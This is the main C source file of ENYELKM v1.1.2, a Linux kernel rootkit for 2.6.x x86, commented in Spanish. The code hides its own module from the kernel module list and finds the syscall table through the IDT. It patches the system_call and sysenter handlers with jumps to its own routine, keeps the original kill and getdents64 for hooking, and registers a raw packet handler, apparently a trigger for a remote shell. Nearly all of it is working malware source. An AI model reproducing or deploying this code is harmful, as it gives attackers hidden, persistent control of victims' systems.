/*
 * ENYELKM v1.1.2
 * Linux Rootkit x86 kernel v2.6.x
 *
 * LKM desarrollado por: 
 *
 * RaiSe
 * < raise@enye-sec.org 
 * http://www.enye-sec.org >
 *
 * David Reguera Garcia
 * < davidregar@yahoo.es 
 * http://www.fr33project.org >
 */

#include "base.h"

unsigned long dire_exit, after_call;
unsigned long dire_call, global_ip;

int can_unload_lkm = 1;

short read_activo, lanzar_shell;

backup_memory_t backup_memory;

void *  sysenter_entry;
void ** sys_call_table;

struct   packet_type my_pkt;
unsigned short global_port;

int errno;

/* punteros a syscalls originales */
asmlinkage int  ( * orig_kill )       ( pid_t, int );
asmlinkage long ( * orig_getdents64 ) ( unsigned int, struct dirent64 *, unsigned int );

/* prototipos funciones */
void * get_system_call   ( void );
void * get_sys_call_table( void * );
void set_idt_handler     ( void * );
void set_sysenter_handler( void * );

int hide_module( void );

int init_module( void )
{
    void * system_call;

    if ( hide_module() == -1 )
        return -1;

    init_backup_memory( & backup_memory );

    sysenter_entry = get_sysenter_entry();

    if ( sysenter_entry == NULL )
        return -1;

    /* variables de control */
    lanzar_shell = read_activo = 0;
    global_ip    = 0xffffffff;

    /* averiguar sys_call_table */
    system_call    = get_system_call();
    sys_call_table = get_sys_call_table( system_call );

    /* punteros a syscalls originales */
    orig_kill       = sys_call_table[__NR_kill];
    orig_getdents64 = sys_call_table[__NR_getdents64];

    /* modificar los handlers */
    set_idt_handler( system_call );
    set_sysenter_handler( sysenter_entry );

    my_pkt.type = htons( ETH_P_ALL );
    my_pkt.func = capturar;
    dev_add_pack( & my_pkt );

    #if DEBUG == 1
        printk( "enyelkm instalado!\n" );
    #endif

    return 0;
} /*********** fin init_module ***********/

void cleanup_module( void )
{
    restore_memory( & backup_memory );

    __dev_remove_pack( & my_pkt );

    /* dejar terminar procesos que estan 'leyendo' */
    while ( read_activo != 0 || can_unload_lkm != 1 )
        schedule();

    #if DEBUG == 1
        printk( "enyelkm desinstalado!\n" );
    #endif
} /*********** fin cleanup_module ************/

int hide_module()
{
    struct module * m = & __this_module;

    /* borramos nuestro modulo de la lista */
    if ( m->init == init_module )
	list_del( & m->list );
    else
        return -1;

    return 0;
} /*********** fin de hide_module() ***********/

void * get_system_call( void )
{	
    unsigned              char idtr[6];
    unsigned              long base;
    struct idt_descriptor desc;

    asm ("sidt %0" : "=m" (idtr));
    base = *((unsigned long *) & idtr[2]);
    memcpy( & desc, (void *) (base + (0x80*8)), sizeof(desc) );

    return                                                    \
        (                                                     \
            (void *) ( (desc.off_high << 16) + desc.off_low ) \
        );                                                    
} /*********** fin get_sys_call_table() ***********/

void * get_sys_call_table( void * system_call )
{
    unsigned char * p;
    unsigned long   sys_call_table;

    p = (unsigned char *) system_call;

    while ( !is_call_opcode( (unsigned char *) p ) )
        p++;

    dire_call = (unsigned long) p;

    p += DISTANCE_FROM_DIRE_CALL_TO_SYSCALL_TABLE;
    sys_call_table = *((unsigned long *) p);

    p += DISTANCE_FROM_SYSCALL_TABLE_TO_AFTER_CALL;
    after_call = (unsigned long) p;

    /* cli */
    while ( * p != CLI_OPCODE )
        p++;

    dire_exit = (unsigned long) p;

    return (void *) sys_call_table;
} /********** fin get_sys_call_table() *************/

void set_idt_handler( void * system_call )
{
    unsigned char * p;
    push_ret_t      push_ret;

    p = (unsigned char *) system_call;

    /* primer salto */
    while ( !is_jnb_opcode( (unsigned char *) p ) )
        p ++;

    p -= DISTANCE_FROM_CMP_NR_SYSCALL_TO_JNB;

    create_push_ret( & push_ret, (unsigned long) new_idt );
    save_memory( (unsigned long) p, & backup_memory );
    write_push_ret( ( void *) p, & push_ret );

    /* syscall_trace_entry salto */
    while ( !is_jnb_opcode( (unsigned char *) p ) )
        p ++;

    p -= DISTANCE_FROM_CMP_NR_SYSCALL_TO_JNB;

    create_push_ret( & push_ret, (unsigned long) new_idt );
    save_memory( (unsigned long) p, & backup_memory );
    write_push_ret( ( void *) p, & push_ret );
} /********** fin set_idt_handler() ***********/

void set_sysenter_handler( void * sysenter )
{
    unsigned char * p;
    push_ret_t      push_ret;

    p = (unsigned char *) sysenter;

    /* buscamos call */
    while ( !is_call_opcode( (unsigned char *) p ) )
        p ++;

    /* buscamos el jae syscall_badsys */
    while ( !is_jnb_opcode( (unsigned char *) p ) )
        p --;

    p -= 5;

    create_push_ret( & push_ret, (unsigned long) new_idt );
    save_memory( (unsigned long) p, & backup_memory );
    write_push_ret( ( void *) p, & push_ret );
} /************* fin set_sysenter_handler **********/

/* Licencia GPL */
MODULE_LICENSE("GPL");

/* EOF */
